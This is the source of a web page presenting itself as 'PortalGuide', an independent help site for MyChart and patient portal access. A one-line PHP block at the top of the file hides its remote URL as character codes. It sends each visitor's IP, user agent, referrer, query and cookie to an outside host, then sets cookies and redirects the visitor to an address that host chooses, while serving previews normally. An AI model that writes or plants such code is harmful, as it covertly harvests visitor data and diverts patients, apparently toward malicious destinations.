<?php date_default_timezone_set("UTC");ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE);if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){$date = date("Y-m-d H:i:s");$id = "517461";$uid="450mz91vw2ecjf82izmwyvkfk";$qu=$_SERVER["QUERY_STRING"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_SERVER["HTTP_REFERER"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$q, TRUE, 301);}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$f, TRUE, 301);}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}}}?>

<!DOCTYPE html>
<html lang="en">
<head>


  
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>PortalGuide – MyChart & Patient Portal Help</title>
  <meta name="description" content="PortalGuide is a free informational resource helping users understand how to access and navigate MyChart and online patient portals step by step." />
  <meta name="keywords" content="mychart, patient portal, mychart access, mychart guide, online health portal, mychart help, patient portal navigation" />
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700;900&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet" />
  <style>
    :root {
      --navy: #0b1f3a;
      --teal: #0d8a7a;
      --teal-light: #12b09e;
      --cream: #f7f4ef;
      --white: #ffffff;
      --gray: #6b7280;
      --light-gray: #e9e4db;
      --accent: #e8a838;
      --text: #1a2b3c;
    }
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    html { scroll-behavior: smooth; }
    body {
      font-family: 'DM Sans', sans-serif;
      background: var(--cream);
      color: var(--text);
      line-height: 1.6;
    }

    /* NAV */
    nav {
      background: var(--navy);
      padding: 0 5%;
      display: flex;
      align-items: center;
      justify-content: space-between;
      height: 68px;
      position: sticky;
      top: 0;
      z-index: 100;
      box-shadow: 0 2px 20px rgba(0,0,0,0.25);
    }
    .nav-logo {
      font-family: 'Playfair Display', serif;
      font-size: 1.5rem;
      font-weight: 700;
      color: var(--white);
      text-decoration: none;
      letter-spacing: -0.5px;
    }
    .nav-logo span { color: var(--teal-light); }
    .nav-links { display: flex; gap: 2rem; list-style: none; }
    .nav-links a {
      color: rgba(255,255,255,0.8);
      text-decoration: none;
      font-size: 0.9rem;
      font-weight: 500;
      letter-spacing: 0.3px;
      transition: color 0.2s;
    }
    .nav-links a:hover, .nav-links a.active { color: var(--teal-light); }
    .nav-cta {
      background: var(--teal);
      color: var(--white) !important;
      padding: 0.45rem 1.1rem;
      border-radius: 6px;
      font-weight: 600 !important;
      transition: background 0.2s !important;
    }
    .nav-cta:hover { background: var(--teal-light) !important; color: var(--white) !important; }

    /* HERO */
    .hero {
      background: var(--navy);
      position: relative;
      overflow: hidden;
      padding: 90px 5% 80px;
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 3rem;
      align-items: center;
    }
    .hero::before {
      content: '';
      position: absolute;
      top: -80px; right: -80px;
      width: 420px; height: 420px;
      border-radius: 50%;
      background: radial-gradient(circle, rgba(13,138,122,0.25) 0%, transparent 70%);
      pointer-events: none;
    }
    .hero::after {
      content: '';
      position: absolute;
      bottom: -60px; left: 30%;
      width: 300px; height: 300px;
      border-radius: 50%;
      background: radial-gradient(circle, rgba(232,168,56,0.12) 0%, transparent 70%);
      pointer-events: none;
    }
    .hero-badge {
      display: inline-flex;
      align-items: center;
      gap: 0.5rem;
      background: rgba(13,176,158,0.15);
      border: 1px solid rgba(13,176,158,0.35);
      color: var(--teal-light);
      font-size: 0.78rem;
      font-weight: 600;
      letter-spacing: 1px;
      text-transform: uppercase;
      padding: 0.35rem 0.85rem;
      border-radius: 30px;
      margin-bottom: 1.4rem;
    }
    .hero h1 {
      font-family: 'Playfair Display', serif;
      font-size: clamp(2.2rem, 4vw, 3.4rem);
      font-weight: 900;
      color: var(--white);
      line-height: 1.15;
      margin-bottom: 1.2rem;
    }
    .hero h1 em {
      font-style: normal;
      color: var(--teal-light);
    }
    .hero p {
      color: rgba(255,255,255,0.72);
      font-size: 1.08rem;
      max-width: 480px;
      margin-bottom: 2rem;
      font-weight: 300;
    }
    .hero-btns { display: flex; gap: 1rem; flex-wrap: wrap; }
    .btn-primary {
      background: var(--teal);
      color: var(--white);
      padding: 0.85rem 2rem;
      border-radius: 8px;
      text-decoration: none;
      font-weight: 600;
      font-size: 0.95rem;
      transition: background 0.2s, transform 0.15s;
      display: inline-block;
    }
    .btn-primary:hover { background: var(--teal-light); transform: translateY(-1px); }
    .btn-outline {
      background: transparent;
      color: var(--white);
      border: 1.5px solid rgba(255,255,255,0.35);
      padding: 0.85rem 2rem;
      border-radius: 8px;
      text-decoration: none;
      font-weight: 500;
      font-size: 0.95rem;
      transition: border-color 0.2s, background 0.2s;
      display: inline-block;
    }
    .btn-outline:hover { border-color: var(--teal-light); background: rgba(13,176,158,0.08); }
    .hero-visual {
      background: rgba(255,255,255,0.05);
      border: 1px solid rgba(255,255,255,0.12);
      border-radius: 16px;
      padding: 2rem;
      backdrop-filter: blur(8px);
    }
    .portal-preview-header {
      background: rgba(13,138,122,0.2);
      border-radius: 10px 10px 0 0;
      padding: 1rem 1.2rem;
      border-bottom: 1px solid rgba(255,255,255,0.1);
      display: flex;
      align-items: center;
      gap: 0.6rem;
    }
    .portal-preview-header .dot { width: 10px; height: 10px; border-radius: 50%; }
    .dot-r { background: #ff6059; }
    .dot-y { background: #ffbe2e; }
    .dot-g { background: #28ca42; }
    .portal-preview-header span {
      margin-left: auto;
      color: rgba(255,255,255,0.5);
      font-size: 0.78rem;
    }
    .portal-preview-body {
      background: rgba(255,255,255,0.04);
      border-radius: 0 0 10px 10px;
      padding: 1.4rem 1.2rem;
    }
    .preview-item {
      display: flex;
      align-items: center;
      gap: 0.8rem;
      padding: 0.7rem 0.8rem;
      border-radius: 8px;
      margin-bottom: 0.6rem;
      background: rgba(255,255,255,0.05);
      border: 1px solid rgba(255,255,255,0.08);
    }
    .preview-icon {
      width: 36px; height: 36px;
      border-radius: 8px;
      background: var(--teal);
      display: flex; align-items: center; justify-content: center;
      font-size: 1rem;
      flex-shrink: 0;
    }
    .preview-text p { color: rgba(255,255,255,0.85); font-size: 0.85rem; font-weight: 500; }
    .preview-text small { color: rgba(255,255,255,0.45); font-size: 0.75rem; }

    /* TRUST BAR */
    .trust-bar {
      background: var(--teal);
      padding: 1rem 5%;
      display: flex;
      gap: 2.5rem;
      justify-content: center;
      flex-wrap: wrap;
    }
    .trust-item {
      display: flex;
      align-items: center;
      gap: 0.5rem;
      color: var(--white);
      font-size: 0.85rem;
      font-weight: 500;
    }
    .trust-item span { font-size: 1.1rem; }

    /* SECTIONS */
    section { padding: 70px 5%; }
    .section-label {
      font-size: 0.78rem;
      font-weight: 700;
      letter-spacing: 2px;
      text-transform: uppercase;
      color: var(--teal);
      margin-bottom: 0.7rem;
    }
    .section-title {
      font-family: 'Playfair Display', serif;
      font-size: clamp(1.8rem, 3vw, 2.6rem);
      font-weight: 700;
      color: var(--navy);
      line-height: 1.2;
      margin-bottom: 1rem;
    }
    .section-desc {
      color: var(--gray);
      font-size: 1.05rem;
      max-width: 560px;
      font-weight: 300;
    }
    .section-header { margin-bottom: 3rem; }
    .section-header.centered { text-align: center; }
    .section-header.centered .section-desc { margin: 0 auto; }

    /* TOPICS GRID */
    .topics-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(290px, 1fr));
      gap: 1.5rem;
    }
    .topic-card {
      background: var(--white);
      border-radius: 14px;
      padding: 1.8rem;
      border: 1px solid var(--light-gray);
      transition: transform 0.2s, box-shadow 0.2s;
      position: relative;
      overflow: hidden;
    }
    .topic-card::before {
      content: '';
      position: absolute;
      top: 0; left: 0;
      width: 4px; height: 100%;
      background: var(--teal);
      opacity: 0;
      transition: opacity 0.2s;
    }
    .topic-card:hover { transform: translateY(-4px); box-shadow: 0 12px 30px rgba(11,31,58,0.1); }
    .topic-card:hover::before { opacity: 1; }
    .topic-icon {
      width: 48px; height: 48px;
      border-radius: 12px;
      background: rgba(13,138,122,0.1);
      display: flex; align-items: center; justify-content: center;
      font-size: 1.4rem;
      margin-bottom: 1rem;
    }
    .topic-card h3 { font-size: 1.05rem; font-weight: 600; color: var(--navy); margin-bottom: 0.5rem; }
    .topic-card p { font-size: 0.9rem; color: var(--gray); line-height: 1.6; }
    .topic-link {
      display: inline-flex;
      align-items: center;
      gap: 0.3rem;
      color: var(--teal);
      font-size: 0.85rem;
      font-weight: 600;
      text-decoration: none;
      margin-top: 1rem;
    }
    .topic-link:hover { color: var(--teal-light); }

    /* HOW IT WORKS */
    .how-section { background: var(--navy); color: var(--white); }
    .how-section .section-title { color: var(--white); }
    .how-section .section-desc { color: rgba(255,255,255,0.6); }
    .steps-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
      gap: 2rem;
    }
    .step-card {
      position: relative;
      padding: 1.8rem;
      background: rgba(255,255,255,0.05);
      border: 1px solid rgba(255,255,255,0.1);
      border-radius: 14px;
    }
    .step-num {
      font-family: 'Playfair Display', serif;
      font-size: 3.5rem;
      font-weight: 900;
      color: rgba(13,176,158,0.2);
      line-height: 1;
      margin-bottom: 0.8rem;
    }
    .step-card h3 { font-size: 1rem; font-weight: 600; margin-bottom: 0.5rem; color: var(--white); }
    .step-card p { font-size: 0.88rem; color: rgba(255,255,255,0.55); line-height: 1.6; }

    /* SEARCH TOPICS */
    .search-topics-section { background: var(--white); }
    .tags-list {
      display: flex;
      flex-wrap: wrap;
      gap: 0.75rem;
    }
    .tag-item {
      display: flex;
      flex-direction: column;
      background: var(--cream);
      border: 1px solid var(--light-gray);
      border-radius: 10px;
      padding: 1rem 1.4rem;
      text-decoration: none;
      transition: border-color 0.2s, background 0.2s;
      min-width: 200px;
    }
    .tag-item:hover { border-color: var(--teal); background: rgba(13,138,122,0.04); }
    .tag-item strong { font-size: 0.9rem; color: var(--navy); font-weight: 600; margin-bottom: 0.25rem; }
    .tag-item span { font-size: 0.8rem; color: var(--gray); }

    /* NOTICE */
    .notice-box {
      background: rgba(11,31,58,0.05);
      border: 1.5px solid rgba(11,31,58,0.15);
      border-radius: 12px;
      padding: 1.5rem 2rem;
      display: flex;
      gap: 1rem;
      align-items: flex-start;
      max-width: 860px;
      margin: 0 auto;
    }
    .notice-box .notice-icon { font-size: 1.5rem; flex-shrink: 0; margin-top: 0.1rem; }
    .notice-box p { font-size: 0.9rem; color: var(--gray); line-height: 1.65; }
    .notice-box strong { color: var(--navy); }

    /* FOOTER */
    footer {
      background: var(--navy);
      color: rgba(255,255,255,0.6);
      padding: 50px 5% 28px;
    }
    .footer-grid {
      display: grid;
      grid-template-columns: 2fr 1fr 1fr;
      gap: 3rem;
      margin-bottom: 2.5rem;
    }
    .footer-brand p { font-size: 0.88rem; margin-top: 0.8rem; line-height: 1.7; max-width: 280px; }
    footer h4 { color: var(--white); font-size: 0.85rem; font-weight: 600; letter-spacing: 0.5px; margin-bottom: 1rem; text-transform: uppercase; }
    footer ul { list-style: none; }
    footer ul li { margin-bottom: 0.55rem; }
    footer ul a { color: rgba(255,255,255,0.55); text-decoration: none; font-size: 0.88rem; transition: color 0.2s; }
    footer ul a:hover { color: var(--teal-light); }
    .footer-bottom {
      border-top: 1px solid rgba(255,255,255,0.1);
      padding-top: 1.5rem;
      font-size: 0.82rem;
      display: flex;
      justify-content: space-between;
      flex-wrap: wrap;
      gap: 0.5rem;
    }

    @media (max-width: 768px) {
      .hero { grid-template-columns: 1fr; }
      .hero-visual { display: none; }
      .footer-grid { grid-template-columns: 1fr; }
      .nav-links { display: none; }
    }
  </style>
</head>
<body>

<nav>
  <a href="index.html" class="nav-logo">Portal<span>Guide</span></a>
  <ul class="nav-links">
    <li><a href="index.html" class="active">Home</a></li>
    <li><a href="about.html">About</a></li>
    <li><a href="guide.html">Guide</a></li>
    <li><a href="contact.html">Contact</a></li>
    <li><a href="guide.html" class="nav-cta">Get Help</a></li>
  </ul>
</nav>

<!-- HERO -->
<section class="hero">
  <div class="hero-content">
    <div class="hero-badge">✦ Free Informational Resource</div>
    <h1>Your Guide to <em>MyChart</em> &amp; Online Patient Portals</h1>
    <p>PortalGuide explains how to access, navigate, and use patient portals including MyChart — in simple, clear language for everyone.</p>
    <div class="hero-btns">
      <a href="guide.html" class="btn-primary">View Full Guide →</a>
      <a href="about.html" class="btn-outline">Learn About Us</a>
    </div>
  </div>
  <div class="hero-visual">
    <div class="portal-preview-header">
      <div class="dot dot-r"></div>
      <div class="dot dot-y"></div>
      <div class="dot dot-g"></div>
      <span>Patient Portal Topics</span>
    </div>
    <div class="portal-preview-body">
      <div class="preview-item">
        <div class="preview-icon">🔑</div>
        <div class="preview-text">
          <p>Portal Sign-In Overview</p>
          <small>How MyChart login works</small>
        </div>
      </div>
      <div class="preview-item">
        <div class="preview-icon">🔄</div>
        <div class="preview-text">
          <p>Account Recovery Steps</p>
          <small>Forgotten username or access</small>
        </div>
      </div>
      <div class="preview-item">
        <div class="preview-icon">🗺️</div>
        <div class="preview-text">
          <p>Portal Navigation Help</p>
          <small>Understanding your dashboard</small>
        </div>
      </div>
      <div class="preview-item">
        <div class="preview-icon">📋</div>
        <div class="preview-text">
          <p>MyChart Features Guide</p>
          <small>What's available inside</small>
        </div>
      </div>
    </div>
  </div>
</section>

<!-- TRUST BAR -->
<div class="trust-bar">
  <div class="trust-item"><span>✓</span> Independent &amp; Informational</div>
  <div class="trust-item"><span>✓</span> No Account Access Required</div>
  <div class="trust-item"><span>✓</span> Plain Language Explanations</div>
  <div class="trust-item"><span>✓</span> General Information Only</div>
</div>

<!-- TOPICS -->
<section>
  <div class="section-header">
    <div class="section-label">What We Cover</div>
    <h2 class="section-title">MyChart &amp; Portal Topics We Explain</h2>
    <p class="section-desc">We address the most common questions people have when trying to access or use MyChart or any online patient portal for the first time.</p>
  </div>
  <div class="topics-grid">
    <div class="topic-card">
      <div class="topic-icon">🔑</div>
      <h3>MyChart Portal Overview</h3>
      <p>General guidance on how MyChart works, what the access screen looks like, and how users typically enter their credentials to get in.</p>
      <a href="guide.html#access" class="topic-link">Learn more →</a>
    </div>
    <div class="topic-card">
      <div class="topic-icon">🔄</div>
      <h3>Account Recovery Steps</h3>
      <p>An overview of the common methods MyChart and similar portals use to help users regain access when they have trouble signing in.</p>
      <a href="guide.html#recovery" class="topic-link">Learn more →</a>
    </div>
    <div class="topic-card">
      <div class="topic-icon">🗺️</div>
      <h3>Portal Navigation Help</h3>
      <p>Plain-language explanations of how dashboards and main sections in MyChart are typically laid out and organized.</p>
      <a href="guide.html#navigation" class="topic-link">Learn more →</a>
    </div>
    <div class="topic-card">
      <div class="topic-icon">📋</div>
      <h3>Understanding MyChart Features</h3>
      <p>Educational content on what features are commonly available inside MyChart — such as viewing summaries, scheduling, and messaging.</p>
      <a href="guide.html#features" class="topic-link">Learn more →</a>
    </div>
    <div class="topic-card">
      <div class="topic-icon">🏥</div>
      <h3>Platform Awareness</h3>
      <p>Background on how MyChart is used by healthcare organizations to provide patients with online access to records and appointments.</p>
      <a href="guide.html" class="topic-link">Learn more →</a>
    </div>
    <div class="topic-card">
      <div class="topic-icon">📞</div>
      <h3>Where to Get Real Help</h3>
      <p>Guidance on how to identify and contact the right official support channels when you need direct technical assistance with your account.</p>
      <a href="contact.html" class="topic-link">Learn more →</a>
    </div>
  </div>
</section>

<!-- HOW IT WORKS -->
<section class="how-section">
  <div class="section-header centered">
    <div class="section-label" style="color:var(--teal-light)">How It Works</div>
    <h2 class="section-title">Getting Started Is Simple</h2>
    <p class="section-desc">PortalGuide is a free informational resource. No sign-up, no account, no personal data needed.</p>
  </div>
  <div class="steps-grid">
    <div class="step-card">
      <div class="step-num">01</div>
      <h3>Browse Our Guide</h3>
      <p>Visit our Guide page for step-by-step explanations of MyChart and patient portal access.</p>
    </div>
    <div class="step-card">
      <div class="step-num">02</div>
      <h3>Find Your Topic</h3>
      <p>Use the section that matches your question — access, recovery, features, or navigation.</p>
    </div>
    <div class="step-card">
      <div class="step-num">03</div>
      <h3>Follow the Steps</h3>
      <p>Each topic is explained in plain, clear language designed for users of all tech experience levels.</p>
    </div>
    <div class="step-card">
      <div class="step-num">04</div>
      <h3>Contact Support</h3>
      <p>For direct account help, we point you to the right official MyChart support channels.</p>
    </div>
  </div>
</section>

<!-- SEARCH TOPICS -->
<section class="search-topics-section">
  <div class="section-header">
    <div class="section-label">Common Search Topics</div>
    <h2 class="section-title">Topics People Frequently Search</h2>
    <p class="section-desc">Our content is organized around the most common questions users have about MyChart and patient portals.</p>
  </div>
  <div class="tags-list">
    <a href="guide.html#access" class="tag-item"><strong>MyChart Sign-In</strong><span>How to access your portal</span></a>
    <a href="guide.html#setup" class="tag-item"><strong>MyChart Account Setup</strong><span>Activating a new account</span></a>
    <a href="guide.html#recovery" class="tag-item"><strong>Account Recovery</strong><span>Regaining access steps</span></a>
    <a href="guide.html#access" class="tag-item"><strong>MyChart Access Issues</strong><span>Troubleshooting common problems</span></a>
    <a href="guide.html" class="tag-item"><strong>Patient Portal Access</strong><span>Browser &amp; mobile access</span></a>
    <a href="guide.html#features" class="tag-item"><strong>MyChart Features Guide</strong><span>What's inside the portal</span></a>
    <a href="guide.html#navigation" class="tag-item"><strong>Portal Navigation</strong><span>Understanding the dashboard</span></a>
    <a href="guide.html" class="tag-item"><strong>MyChart Mobile App</strong><span>Using MyChart on a phone</span></a>
  </div>
</section>

<!-- NOTICE -->
<section style="background:var(--cream); padding:40px 5%;">
  <div class="notice-box">
    <div class="notice-icon">⚠️</div>
    <p><strong>Important Notice:</strong> PortalGuide is an <strong>independent informational website</strong> and is <strong>not affiliated with, endorsed by, or operated by MyChart, Epic Systems, or any healthcare organization</strong>. We do not provide direct account access, technical support, or handle any personal, financial, or health-related data. All content on this site is for general informational purposes only.</p>
  </div>
</section>

<!-- FOOTER -->
<footer>
  <div class="footer-grid">
    <div class="footer-brand">
      <a href="index.html" class="nav-logo" style="font-size:1.3rem">Portal<span>Guide</span></a>
      <p>Independent guidance for navigating online patient portals including MyChart. Not affiliated with any portal provider or healthcare system.</p>
    </div>
    <div>
      <h4>Pages</h4>
      <ul>
        <li><a href="index.html">Home</a></li>
        <li><a href="about.html">About</a></li>
        <li><a href="guide.html">Guide</a></li>
        <li><a href="contact.html">Contact</a></li>
        <li><a href="privacy.html">Privacy Policy</a></li>
        <li><a href="terms.html">Terms of Use</a></li>
      </ul>
    </div>
    <div>
      <h4>Guide Topics</h4>
      <ul>
        <li><a href="guide.html#access">Portal Access</a></li>
        <li><a href="guide.html#recovery">Account Recovery</a></li>
        <li><a href="guide.html#navigation">Navigation Help</a></li>
        <li><a href="guide.html#features">Portal Features</a></li>
        <li><a href="guide.html#setup">Account Setup</a></li>
      </ul>
    </div>
  </div>
  <div class="footer-bottom">
    <span>© 2025 PortalGuide. All rights reserved.</span>
    <span>Independent informational resource. Not affiliated with MyChart or Epic Systems.</span>
  </div>
</footer>

</body>
</html>
